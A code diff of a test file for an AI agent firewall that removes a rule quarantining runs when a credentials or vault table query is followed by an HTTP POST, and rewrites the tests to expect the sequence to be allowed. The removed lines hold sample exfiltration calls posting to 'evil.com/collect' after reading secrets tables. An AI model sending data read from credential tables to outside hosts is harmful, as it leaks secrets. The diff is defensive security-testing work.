@@ -1,12 +1,15 @@
 /**
- * Tests that database tool calls emit metadata.table in events,
- * enabling Rule 6 (secret_access_then_any_egress) to trigger when
- * a query to a secrets-like table is followed by egress.
+ * Database tool calls emit metadata.table in their post-policy event. The rule
+ * that once consumed it (Rule 6, secret_access_then_any_egress) quarantined the
+ * run on the SEQUENCE "secrets-like table queried, then any HTTP POST" with no
+ * evidence the POST carried a row — and is removed: the host judges data flow
+ * (values masked at the source and registered, registered values refused at
+ * every sink). These drive the real firewall to pin that the sequence is now
+ * allowed end to end.
  */
 
 import { unlinkSync } from "node:fs";
 import { resolve } from "node:path";
-import { ToolCallDeniedError } from "@arikernel/core";
 import { afterEach, describe, expect, it } from "vitest";
 import { type Firewall, createFirewall } from "../src/index.js";
 
@@ -81,14 +84,13 @@ function makeFirewall(name: string): Firewall {
 	return fw;
 }
 
-describe("Rule 6: secret_access_then_any_egress — table metadata", () => {
-	it("triggers quarantine when query to credentials table is followed by HTTP POST", async () => {
+describe("secrets-like table query then HTTP POST — table metadata, no sequence-only quarantine", () => {
+	it("a query to a credentials table followed by an HTTP POST is allowed and leaves the run unrestricted", async () => {
 		const fw = makeFirewall("credentials-egress");
 
 		const dbGrant = fw.requestCapability("database.read");
 		const httpGrant = fw.requestCapability("http.write");
 
-		// Step 1: Query a secrets-like table
 		await fw.execute({
 			toolClass: "database",
 			action: "query",
@@ -96,18 +98,19 @@ describe("Rule 6: secret_access_then_any_egress — table metadata", () => {
 			grantId: dbGrant.grant?.id,
 		});
 
-		// Step 2: HTTP POST (egress) — should trigger rule 6
-		await expect(
-			fw.execute({
-				toolClass: "http",
-				action: "post",
-				parameters: { url: "https://evil.com/collect", body: "{}" },
-				grantId: httpGrant.grant?.id,
-			}),
-		).rejects.toThrow(ToolCallDeniedError);
+		// The former rule 6 denied this on sequence alone. The POST body carries
+		// nothing from the query; nothing in the kernel may infer otherwise.
+		const result = await fw.execute({
+			toolClass: "http",
+			action: "post",
+			parameters: { url: "https://api.example.com/report", body: "{}" },
+			grantId: httpGrant.grant?.id,
+		});
+		expect(result.success).toBe(true);
+		expect(fw.isRestricted).toBe(false);
 	});
 
-	it("triggers for vault table name", async () => {
+	it("a vault table name is no different — the POST after it is allowed", async () => {
 		const fw = makeFirewall("vault-egress");
 
 		const dbGrant = fw.requestCapability("database.read");
@@ -120,14 +123,14 @@ describe("Rule 6: secret_access_then_any_egress — table metadata", () => {
 			grantId: dbGrant.grant?.id,
 		});
 
-		await expect(
-			fw.execute({
-				toolClass: "http",
-				action: "post",
-				parameters: { url: "https://evil.com/collect", body: "{}" },
-				grantId: httpGrant.grant?.id,
-			}),
-		).rejects.toThrow(ToolCallDeniedError);
+		const result = await fw.execute({
+			toolClass: "http",
+			action: "post",
+			parameters: { url: "https://api.example.com/report", body: "{}" },
+			grantId: httpGrant.grant?.id,
+		});
+		expect(result.success).toBe(true);
+		expect(fw.quarantineInfo).toBeNull();
 	});
 
 	it("allows egress after query to non-secrets table", async () => {
